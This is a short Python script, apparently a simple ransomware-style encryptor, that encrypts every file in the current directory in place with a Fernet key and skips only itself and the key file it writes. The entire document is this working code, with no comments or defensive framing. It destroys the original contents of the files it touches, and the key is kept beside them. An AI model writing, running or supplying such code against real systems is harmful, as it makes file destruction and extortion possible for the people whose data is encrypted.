import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "secretkey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("secretkey.key", "wb") as secretkey:
    secretkey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contests = thefile.read()
    contests_encrypted = Fernet(key).encrypt(contests)
    with open(file, "wb") as thefile:
        thefile.write(contests_encrypted)
